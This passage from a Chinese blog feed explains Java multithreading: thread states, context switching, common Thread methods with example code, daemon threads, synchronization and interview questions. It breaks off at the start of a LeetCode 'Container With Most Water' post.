<h3 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h3><p>在正式学习Thread类中的具体方法之前，我们先来了解一下线程有哪些状态，这个将会有助于后面对Thread类中的方法的理解。</p>
<ul>
<li>创建（new）状态: 准备好了一个多线程的对象</li>
<li>就绪（runnable）状态: 调用了start()方法, 等待CPU进行调度</li>
<li>运行（running）状态: 执行run()方法</li>
<li>阻塞（blocked）状态: 暂时停止执行, 可能将资源交给其它线程使用</li>
<li>终止（dead）状态: 线程销毁</li>
</ul>
<p>当需要新起一个线程来执行某个子任务时，就创建了一个线程。但是线程创建之后，不会立即进入就绪状态，因为线程的运行需要一些条件（比如内存资源，在前面的JVM内存区域划分一篇博文中知道程序计数器、Java栈、本地方法栈都是线程私有的，所以需要为线程分配一定的内存空间），只有线程运行需要的所有条件满足了，才进入就绪状态。</p>
<p>当线程进入就绪状态后，不代表立刻就能获取CPU执行时间，也许此时CPU正在执行其他的事情，因此它要等待。当得到CPU执行时间之后，线程便真正进入运行状态。</p>
<p>线程在运行状态过程中，可能有多个原因导致当前线程不继续运行下去，比如用户主动让线程睡眠（睡眠一定的时间之后再重新执行）、用户主动让线程等待，或者被同步块给阻塞，此时就对应着多个状态：time waiting（睡眠或等待一定的事件）、waiting（等待被唤醒）、blocked（阻塞）。</p>
<p>当由于突然中断或者子任务执行完毕，线程就会被消亡。</p>
<p>下面这副图描述了线程从创建到消亡之间的状态：</p>
<p><img src="/images/java-多线程-02.png" alt="线程状态图"></p>
<p>在有些教程上将blocked、waiting、time waiting统称为阻塞状态，这个也是可以的，只不过这里我想将线程的状态和Java中的方法调用联系起来，所以将waiting和time waiting两个状态分离出来。</p>
<p>注:sleep和wait的区别:</p>
<ul>
<li>sleep是Thread类的方法,wait是Object类中定义的方法.</li>
<li>Thread.sleep不会导致锁行为的改变, 如果当前线程是拥有锁的, 那么Thread.sleep不会让线程释放锁.</li>
<li>Thread.sleep和Object.wait都会暂停当前的线程. OS会将执行时间分配给其它线程. 区别是, 调用wait后, 需要别的线程执行notify/notifyAll才能够重新获得CPU执行时间.</li>
</ul>
<h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><p>对于单核CPU来说（对于多核CPU，此处就理解为一个核），CPU在一个时刻只能运行一个线程，当在运行一个线程的过程中转去运行另外一个线程，这个叫做线程上下文切换（对于进程也是类似）。</p>
<p>由于可能当前线程的任务并没有执行完毕，所以在切换时需要保存线程的运行状态，以便下次重新切换回来时能够继续切换之前的状态运行。举个简单的例子：比如一个线程A正在读取一个文件的内容，正读到文件的一半，此时需要暂停线程A，转去执行线程B，当再次切换回来执行线程A的时候，我们不希望线程A又从文件的开头来读取。</p>
<p>因此需要记录线程A的运行状态，那么会记录哪些数据呢？因为下次恢复时需要知道在这之前当前线程已经执行到哪条指令了，所以需要记录程序计数器的值，另外比如说线程正在进行某个计算的时候被挂起了，那么下次继续执行的时候需要知道之前挂起时变量的值时多少，因此需要记录CPU寄存器的状态。所以一般来说，线程上下文切换过程中会记录程序计数器、CPU寄存器状态等数据。</p>
<p><strong>说简单点的：对于线程的上下文切换实际上就是 存储和恢复CPU状态的过程，它使得线程执行能够从中断点恢复执行</strong>。</p>
<p>虽然多线程可以使得任务执行的效率得到提升，但是由于在线程切换时同样会带来一定的开销代价，并且多个线程会导致系统资源占用的增加，所以在进行多线程编程时要注意这些因素。</p>
<h3 id="线程的常用方法"><a href="#线程的常用方法" class="headerlink" title="线程的常用方法"></a>线程的常用方法</h3><table>
<thead>
<tr>
<th>编号</th>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>public void start()</td>
<td>使该线程开始执行；Java 虚拟机调用该线程的 run 方法。</td>
</tr>
<tr>
<td>2</td>
<td>public void run()</td>
<td>如果该线程是使用独立的 Runnable 运行对象构造的，则调用该 Runnable 对象的 run 方法；否则，该方法不执行任何操作并返回。</td>
</tr>
<tr>
<td>3</td>
<td>public final void setName(String name)</td>
<td>改变线程名称，使之与参数 name 相同。</td>
</tr>
<tr>
<td>4</td>
<td>public final void setPriority(int priority)</td>
<td>更改线程的优先级。</td>
</tr>
<tr>
<td>5</td>
<td>public final void setDaemon(boolean on )</td>
<td>将该线程标记为守护线程或用户线程。</td>
</tr>
<tr>
<td>6</td>
<td>public final void join(long millisec)</td>
<td>等待该线程终止的时间最长为 millis 毫秒。</td>
</tr>
<tr>
<td>7</td>
<td>public void interrupt()</td>
<td>中断线程。</td>
</tr>
<tr>
<td>8</td>
<td>public final boolean isAlive()</td>
<td>测试线程是否处于活动状态。</td>
</tr>
<tr>
<td>9</td>
<td>public static void yield()</td>
<td>暂停当前正在执行的线程对象，并执行其他线程。</td>
</tr>
<tr>
<td>10</td>
<td>public static void sleep(long millisec)</td>
<td>在指定的毫秒数内让当前正在执行的线程休眠（暂停执行），此操作受到系统计时器和调度程序精度和准确性的影响。</td>
</tr>
<tr>
<td>11</td>
<td>public static Thread currentThread()</td>
<td>返回对当前正在执行的线程对象的引用。</td>
</tr>
</tbody>
</table>
<p><img src="/images/java-多线程-03.png" alt="线程方法"></p>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><h5 id="currentThread-方法"><a href="#currentThread-方法" class="headerlink" title="currentThread()方法"></a>currentThread()方法</h5><p>currentThread()方法可以返回代码段正在被哪个线程调用的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public class Run&#123;</div><div class="line">    public static void main(String[] args)&#123;                 </div><div class="line">    	System.out.println(Thread.currentThread().getName());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="sleep-方法"><a href="#sleep-方法" class="headerlink" title="sleep()方法"></a>sleep()方法</h5><p>方法sleep()的作用是在指定的毫秒数内让当前“正在执行的线程”休眠（暂停执行）。这个“正在执行的线程”是指this.currentThread()返回的线程。</p>
<p>sleep方法有两个重载版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sleep(long millis)     //参数为毫秒</div><div class="line">sleep(long millis,int nanoseconds)    //第一参数为毫秒，第二个参数为纳秒</div></pre></td></tr></table></figure>
<p>sleep相当于让线程睡眠，交出CPU，让CPU去执行其他的任务。</p>
<p>但是有一点要非常注意，sleep方法不会释放锁，也就是说如果当前线程持有对某个对象的锁，则即使调用sleep方法，其他线程也无法访问这个对象。看下面这个例子就清楚了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">public class Test &#123;</div><div class="line"> </div><div class="line">    private int i = 10;</div><div class="line">    private Object object = new Object();</div><div class="line"> </div><div class="line">    public static void main(String[] args)   &#123;</div><div class="line">        Test test = new Test();</div><div class="line">        MyThread thread1 = test.new MyThread();</div><div class="line">        MyThread thread2 = test.new MyThread();</div><div class="line">        thread1.start();</div><div class="line">        thread2.start();</div><div class="line">    &#125; </div><div class="line"> </div><div class="line">    class MyThread extends Thread&#123;</div><div class="line">        @Override</div><div class="line">        public void run() &#123;</div><div class="line">            synchronized (object) &#123;</div><div class="line">                i++;</div><div class="line">                System.out.println(&quot;i:&quot;+i);</div><div class="line">                try &#123;</div><div class="line">                    System.out.println(&quot;Thread &quot;+Thread.currentThread().getName()+&quot; is sleeping&quot;);</div><div class="line">                    Thread.currentThread().sleep(10000);</div><div class="line">                &#125; catch (InterruptedException e) &#123;</div><div class="line">                    // TODO: handle exception</div><div class="line">                &#125;</div><div class="line">                System.out.println(&quot;Thread &quot;+Thread.currentThread().getName()+&quot; is up&quot;);</div><div class="line">                i++;</div><div class="line">                System.out.println(&quot;i:&quot;+i);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/images/java-多线程-04.png" alt="执行结果"></p>
<p>从上面输出结果可以看出，当Thread-0进入睡眠状态之后，Thread-1并没有去执行具体的任务。只有当Thread-0执行完之后，此时Thread-0释放了对象锁，Thread-1才开始执行。</p>
<p>注意，如果调用了sleep方法，必须捕获InterruptedException异常或者将该异常向上层抛出。当线程睡眠时间满后，不一定会立即得到执行，因为此时可能CPU正在执行其他的任务。所以说调用sleep方法相当于让线程进入阻塞状态。</p>
<h5 id="yield-方法"><a href="#yield-方法" class="headerlink" title="yield()方法"></a>yield()方法</h5><p>调用yield方法会让当前线程交出CPU权限，让CPU去执行其他的线程。它跟sleep方法类似，同样不会释放锁。但是yield不能控制具体的交出CPU的时间，另外，yield方法只能让拥有相同优先级的线程有获取CPU执行时间的机会。<br>注意，调用yield方法并不会让线程进入阻塞状态，而是让线程重回就绪状态，它只需要等待重新获取CPU执行时间，这一点是和sleep方法不一样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">public class MyThread  extends Thread&#123;</div><div class="line">    @Override</div><div class="line">    public void run() &#123;</div><div class="line">        long beginTime=System.currentTimeMillis();</div><div class="line">        int count=0;</div><div class="line">        for (int i=0;i&lt;50000000;i++)&#123;</div><div class="line">            count=count+(i+1);</div><div class="line">            //Thread.yield();</div><div class="line">        &#125;</div><div class="line">        long endTime=System.currentTimeMillis();</div><div class="line">        System.out.println(&quot;用时：&quot;+(endTime-beginTime)+&quot; 毫秒！&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line">public class Run &#123;</div><div class="line">    public static void main(String[] args) &#123;</div><div class="line">        MyThread t= new MyThread();</div><div class="line">        t.start();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行结果：</p>
<blockquote>
<p>用时：3 毫秒！</p>
</blockquote>
<p>如果将 //Thread.yield();的注释去掉，执行结果如下：</p>
<blockquote>
<p>用时：16080 毫秒！</p>
</blockquote>
<h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><h5 id="start-方法"><a href="#start-方法" class="headerlink" title="start()方法"></a>start()方法</h5><p>start()用来启动一个线程，当调用start方法后，系统才会开启一个新的线程来执行用户定义的子任务，在这个过程中，会为相应的线程分配需要的资源。</p>
<h5 id="run-方法"><a href="#run-方法" class="headerlink" title="run()方法"></a>run()方法</h5><p>run()方法是不需要用户来调用的，当通过start方法启动一个线程之后，当线程获得了CPU执行时间，便进入run方法体去执行具体的任务。注意，继承Thread类必须重写run方法，在run方法中定义具体要执行的任务。</p>
<h5 id="getId"><a href="#getId" class="headerlink" title="getId()"></a>getId()</h5><p>getId()的作用是取得线程的唯一标识</p>
<pre><code>public class Test {
    public static void main(String[] args) {
        Thread t= Thread.currentThread();
        System.out.println(t.getName()+&quot; &quot;+t.getId());
    }
}
</code></pre><p>输出</p>
<blockquote>
<p>main 1</p>
</blockquote>
<h5 id="isAlive-方法"><a href="#isAlive-方法" class="headerlink" title="isAlive()方法"></a>isAlive()方法</h5><p>方法isAlive()的功能是判断当前线程是否处于活动状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public class MyThread  extends Thread&#123;</div><div class="line">    @Override</div><div class="line">    public void run() &#123;</div><div class="line">        System.out.println(&quot;run=&quot;+this.isAlive());</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">public class RunTest &#123;</div><div class="line">    public static void main(String[] args) throws InterruptedException &#123;</div><div class="line">        MyThread myThread=new MyThread();</div><div class="line">        System.out.println(&quot;begin ==&quot;+myThread.isAlive());</div><div class="line">        myThread.start();</div><div class="line">        System.out.println(&quot;end ==&quot;+myThread.isAlive());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>程序运行结果：</p>
<pre><code>---------- java ----------
begin ==false
end ==true
run=true

Output completed (0 sec consumed) - Normal Termination
</code></pre><p>方法isAlive()的作用是测试线程是否偶处于活动状态。什么是活动状态呢？活动状态就是线程已经启动且尚未终止。线程处于正在运行或准备开始运行的状态，就认为线程是“存活”的。<br>有个需要注意的地方</p>
<p><code>System.out.println(&quot;end ==&quot;+myThread.isAlive());</code><br>虽然上面的实例中打印的值是true,但此值是不确定的。打印true值是因为myThread线程还未执行完毕，所以输出true。如果代码改成下面这样，加了个sleep休眠：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">public static void main(String[] args) throws InterruptedException &#123;</div><div class="line">        MyThread myThread=new MyThread();</div><div class="line">        System.out.println(&quot;begin ==&quot;+myThread.isAlive());</div><div class="line">        myThread.start();</div><div class="line">        Thread.sleep(1000);</div><div class="line">        System.out.println(&quot;end ==&quot;+myThread.isAlive());</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>则执行结果输出为false,因为mythread对象已经在1秒之内执行完毕。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---------- java ----------</div><div class="line">begin ==false</div><div class="line">run=true</div><div class="line">end ==false</div><div class="line"></div><div class="line">Output completed (1 sec consumed) - Normal Termination</div></pre></td></tr></table></figure></p>
<h5 id="join-方法"><a href="#join-方法" class="headerlink" title="join()方法"></a>join()方法</h5><p>在很多情况下，主线程创建并启动了线程，如果子线程中药进行大量耗时运算，主线程往往将早于子线程结束之前结束。这时，如果主线程想等待子线程执行完成之后再结束，比如子线程处理一个数据，主线程要取得这个数据中的值，就要用到join()方法了。方法join()的作用是等待线程对象销毁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">public class Test extends Thread&#123;</div><div class="line">    public Test(String name) &#123;</div><div class="line">        super(name);</div><div class="line">    &#125;</div><div class="line">    public void run() &#123;</div><div class="line">        for (int i = 0; i &lt; 5; i++) &#123;</div><div class="line">            System.out.println(getName() + &quot;  &quot; + i);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    public static void main(String[] args) throws InterruptedException &#123;</div><div class="line">        </div><div class="line">        new Test(&quot;new thread&quot;).start();</div><div class="line">        for (int i = 0; i &lt; 10; i++) &#123;</div><div class="line">            if (i == 5) &#123;</div><div class="line">                Test th = new Te(&quot;joined thread&quot;);</div><div class="line">                th.start();</div><div class="line">                th.join();</div><div class="line">            &#125;</div><div class="line">            System.out.println(Thread.currentThread().getName() + &quot;  &quot; + i);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行结果：<br><img src="/images/java-多线程-07.png" alt="result one"><br><img src="/images/java-多线程-08.png" alt="result two"></p>
<p>由上可以看出main主线程与new thread 的执行顺序是不确定的，交替执行，但当joined thread 执行join()后，主线程等待joined thread线程先执行完了才结束的。如果把th.join()这行注释掉，运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">---------- java ----------</div><div class="line">main  0</div><div class="line">new thread  0</div><div class="line">main  1</div><div class="line">main  2</div><div class="line">new thread  1</div><div class="line">main  3</div><div class="line">new thread  2</div><div class="line">main  4</div><div class="line">new thread  3</div><div class="line">new thread  4</div><div class="line">joined thread  0</div><div class="line">joined thread  1</div><div class="line">joined thread  2</div><div class="line">main  5</div><div class="line">joined thread  3</div><div class="line">main  6</div><div class="line">main  7</div><div class="line">main  8</div><div class="line">main  9</div><div class="line">joined thread  4</div><div class="line"></div><div class="line">Output completed (1 sec consumed) - Normal Termination</div></pre></td></tr></table></figure>
<h5 id="getName和setName"><a href="#getName和setName" class="headerlink" title="getName和setName"></a>getName和setName</h5><p>用来得到或者设置线程名称。</p>
<h5 id="getPriority和setPriority"><a href="#getPriority和setPriority" class="headerlink" title="getPriority和setPriority"></a>getPriority和setPriority</h5><p>用来获取和设置线程优先级。</p>
<h5 id="setDaemon和isDaemon"><a href="#setDaemon和isDaemon" class="headerlink" title="setDaemon和isDaemon"></a>setDaemon和isDaemon</h5><p>用来设置线程是否成为守护线程和判断线程是否是守护线程。</p>
<p>守护线程和用户线程的区别在于：守护线程依赖于创建它的线程，而用户线程则不依赖。举个简单的例子：如果在main线程中创建了一个守护线程，当main方法运行完毕之后，守护线程也会随着消亡。而用户线程则不会，用户线程会一直运行直到其运行完毕。在JVM中，像垃圾收集器线程就是守护线程。</p>
<p>在上面已经说到了Thread类中的大部分方法，那么Thread类中的方法调用到底会引起线程状态发生怎样的变化呢？下面一幅图就是在上面的图上进行改进而来的：</p>
<p><img src="/images/java-多线程-10.png" alt="对应方法的状态"></p>
<h3 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h3><p>停止线程是在多线程开发时很重要的技术点，掌握此技术可以对线程的停止进行有效的处理。<br>停止一个线程可以使用Thread.stop()方法，但最好不用它。该方法是不安全的，已被弃用。<br>在Java中有以下3种方法可以终止正在运行的线程：</p>
<ul>
<li>使用退出标志，使线程正常退出，也就是当run方法完成后线程终止</li>
<li>使用stop方法强行终止线程，但是不推荐使用这个方法，因为stop和suspend及resume一样，都是作废过期的方法，使用他们可能产生不可预料的结果。</li>
<li>使用interrupt方法中断线程，但这个不会终止一个正在运行的线程，还需要加入一个判断才可以完成线程的停止。</li>
</ul>
<h3 id="暂停线程"><a href="#暂停线程" class="headerlink" title="暂停线程"></a>暂停线程</h3><p>interrupt()方法</p>
<h3 id="线程的优先级"><a href="#线程的优先级" class="headerlink" title="线程的优先级"></a>线程的优先级</h3><p>在操作系统中，线程可以划分优先级，优先级较高的线程得到的CPU资源较多，也就是CPU优先执行优先级较高的线程对象中的任务。<br>设置线程优先级有助于帮“线程规划器”确定在下一次选择哪一个线程来优先执行。<br>设置线程的优先级使用setPriority()方法，此方法在JDK的源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public final void setPriority(int newPriority) &#123;</div><div class="line">        ThreadGroup g;</div><div class="line">        checkAccess();</div><div class="line">        if (newPriority &gt; MAX_PRIORITY || newPriority &lt; MIN_PRIORITY) &#123;</div><div class="line">            throw new IllegalArgumentException();</div><div class="line">        &#125;</div><div class="line">        if((g = getThreadGroup()) != null) &#123;</div><div class="line">            if (newPriority &gt; g.getMaxPriority()) &#123;</div><div class="line">                newPriority = g.getMaxPriority();</div><div class="line">            &#125;</div><div class="line">            setPriority0(priority = newPriority);</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在Java中，线程的优先级分为1~10这10个等级，如果小于1或大于10，则JDK抛出异常throw new IllegalArgumentException()。<br>JDK中使用3个常量来预置定义优先级的值，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public final static int MIN_PRIORITY = 1;</div><div class="line">public final static int NORM_PRIORITY = 5;</div><div class="line">public final static int MAX_PRIORITY = 10;</div></pre></td></tr></table></figure></p>
<p>线程优先级特性：</p>
<ul>
<li>继承性<br>比如A线程启动B线程，则B线程的优先级与A是一样的。</li>
<li>规则性<br>高优先级的线程总是大部分先执行完，但不代表高优先级线程全部先执行完。</li>
<li>随机性<br>优先级较高的线程不一定每一次都先执行完。</li>
</ul>
<h3 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h3><p>在Java线程中有两种线程，一种是User Thread（用户线程），另一种是Daemon Thread(守护线程)。<br>Daemon的作用是为其他线程的运行提供服务，比如说GC线程。其实User Thread线程和Daemon Thread守护线程本质上来说去没啥区别的，唯一的区别之处就在虚拟机的离开：如果User Thread全部撤离，那么Daemon Thread也就没啥线程好服务的了，所以虚拟机也就退出了。</p>
<p>只要当前JVM实例中尚存任何一个非守护线程没有结束，守护线程就全部工作；只有当最后一个非守护线程结束是，守护线程随着JVM一同结束工作，Daemon作用是为其他线程提供便利服务，守护线程最典型的应用就是GC(垃圾回收器)，他就是一个很称职的守护者。</p>
<p>守护线程并非虚拟机内部可以提供，用户也可以自行的设定守护线程，方法：public final void setDaemon(boolean on) ；但是有几点需要注意：</p>
<ul>
<li>thread.setDaemon(true)必须在thread.start()之前设置，否则会跑出一个IllegalThreadStateException异常。你不能把正在运行的常规线程设置为守护线程。 （备注：这点与守护进程有着明显的区别，守护进程是创建后，让进程摆脱原会话的控制+让进程摆脱原进程组的控制+让进程摆脱原控制终端的控制；所以说寄托于虚拟机的语言机制跟系统级语言有着本质上面的区别）</li>
<li>在Daemon线程中产生的新线程也是Daemon的。 （这一点又是有着本质的区别了：守护进程fork()出来的子进程不再是守护进程，尽管它把父进程的进程相关信息复制过去了，但是子进程的进程的父进程不是init进程，所谓的守护进程本质上说就是“父进程挂掉，init收养，然后文件0,1,2都是/dev/null，当前目录到/”）</li>
<li>不是所有的应用都可以分配给Daemon线程来进行服务，比如读写操作或者计算逻辑。因为在Daemon Thread还没来的及进行操作时，虚拟机可能已经退出了。</li>
</ul>
<h3 id="同步与死锁"><a href="#同步与死锁" class="headerlink" title="同步与死锁"></a>同步与死锁</h3><ul>
<li>同步代码块<br>在代码块上加上”synchronized”关键字，则此代码块就称为同步代码块</li>
<li><p>同步代码块格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">synchronized(同步对象)&#123;</div><div class="line"> 需要同步的代码块;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>同步方法<br>除了代码块可以同步，方法也是可以同步的</p>
</li>
<li>方法同步格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">synchronized void 方法名称()&#123;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h3><h4 id="线程和进程有什么区别？"><a href="#线程和进程有什么区别？" class="headerlink" title="线程和进程有什么区别？"></a>线程和进程有什么区别？</h4><p>答：一个进程是一个独立(self contained)的运行环境，它可以被看作一个程序或者一个应用。而线程是在进程中执行的一个任务。线程是进程的子集，一个进程可以有很多线程，每条线程并行执行不同的任务。不同的进程使用不同的内存空间，而所有的线程共享一片相同的内存空间。别把它和栈内存搞混，每个线程都拥有单独的栈内存用来存储本地数据。</p>
<h4 id="如何在Java中实现线程？"><a href="#如何在Java中实现线程？" class="headerlink" title="如何在Java中实现线程？"></a>如何在Java中实现线程？</h4><p>答：<br>创建线程有两种方式：<br>一、继承 Thread 类，扩展线程。<br>二、实现 Runnable 接口。</p>
<p>启动一个线程是调用run()还是start()方法？<br>答：启动一个线程是调用start()方法，使线程所代表的虚拟处理机处于可运行状态，这意味着它可以由JVM 调度并执行，这并不意味着线程就会立即运行。run()方法是线程启动后要进行回调（callback）的方法。</p>
<p>Thread类的sleep()方法和对象的wait()方法都可以让线程暂停执行，它们有什么区别?<br>答：sleep()方法（休眠）是线程类（Thread）的静态方法，调用此方法会让当前线程暂停执行指定的时间，将执行机会（CPU）让给其他线程，但是对象的锁依然保持，因此休眠时间结束后会自动恢复（线程回到就绪状态，请参考第66题中的线程状态转换图）。wait()是Object类的方法，调用对象的wait()方法导致当前线程放弃对象的锁（线程暂停执行），进入对象的等待池（wait pool），只有调用对象的notify()方法（或notifyAll()方法）时才能唤醒等待池中的线程进入等锁池（lock pool），如果线程重新获得对象的锁就可以进入就绪状态。</p>
<h4 id="线程的sleep-方法和yield-方法有什么区别？"><a href="#线程的sleep-方法和yield-方法有什么区别？" class="headerlink" title="线程的sleep()方法和yield()方法有什么区别？"></a>线程的sleep()方法和yield()方法有什么区别？</h4><p>答：<br>① sleep()方法给其他线程运行机会时不考虑线程的优先级，因此会给低优先级的线程以运行的机会；yield()方法只会给相同优先级或更高优先级的线程以运行的机会；<br>② 线程执行sleep()方法后转入阻塞（blocked）状态，而执行yield()方法后转入就绪（ready）状态；<br>③ sleep()方法声明抛出InterruptedException，而yield()方法没有声明任何异常；<br>④ sleep()方法比yield()方法（跟操作系统CPU调度相关）具有更好的可移植性。</p>
<h4 id="请说出与线程同步以及线程调度相关的方法。"><a href="#请说出与线程同步以及线程调度相关的方法。" class="headerlink" title="请说出与线程同步以及线程调度相关的方法。"></a>请说出与线程同步以及线程调度相关的方法。</h4><p>答：</p>
<ul>
<li>wait()：使一个线程处于等待（阻塞）状态，并且释放所持有的对象的锁；</li>
<li>sleep()：使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要处理InterruptedException异常；</li>
<li>notify()：唤醒一个处于等待状态的线程，当然在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且与优先级无关；</li>
<li>notityAll()：唤醒所有处于等待状态的线程，该方法并不是将对象的锁给所有线程，而是让它们竞争，只有获得锁的线程才能进入就绪状态；</li>
</ul>
<p><a href="http://www.importnew.com/21136.html" target="_blank" rel="external">nice的教程</a><br><a href="http://www.importnew.com/27131.html" target="_blank" rel="external">图解Java多线程</a><br><a href="http://www.importnew.com/26850.html" target="_blank" rel="external">线程通信</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;多线程并发编程是Java编程中重要的一块内容，也是面试重点覆盖区域，所以学好多线程并发编程对我们来说极其重要，下面跟我一起开启本次的学习之旅
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="多线程" scheme="http://yoursite.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode|My code</title>
    <link href="http://yoursite.com/2018/04/19/LeetCode-%D5%BB-My-code/"/>
    <id>http://yoursite.com/2018/04/19/LeetCode-ջ-My-code/</id>
    <published>2018-04-19T15:44:48.000Z</published>
    <updated>2018-05-05T07:56:16.816Z</updated>
    
    <content type="html"><![CDATA[<h3 id="LeetCode-11-Container-With-Most-Water（最大水容器）"><a href="#LeetCode-11-Container-With-Most-Water（最大水容器）" class="headerlink" title="LeetCode 11 Container With Most Water（最大水容器） "></a><a href="https://leetcode-cn.com/problems/container-with-most-water/description/" target="_blank" rel="external">LeetCode 11 Container With Most Water（最大水容器） </a></h3><p>题目大意：给定 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 。画 n 条垂直线，使得垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0)。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。</p>
<p>注意：你不能倾斜容器，n 至少是2。</p>
<p>思路:用两个指针从两端开始向中间靠拢，如果左端线段短于右端，那么左端右移，反之右端左移，直到左右两端移到中间重合，记录这个过程中每一次组成木桶的容积，保留其中最大的。因为当左端线段L小于右端线段R时，我们把L右移，右移到下一个比当前线段大的线段处，这时舍弃的是R与左端其他线段（L+1,L+2, …）组成的木桶，这些木桶是没必要判断的，因为这些木桶的容积肯定都没有L和R组成的木桶容积大。</p>
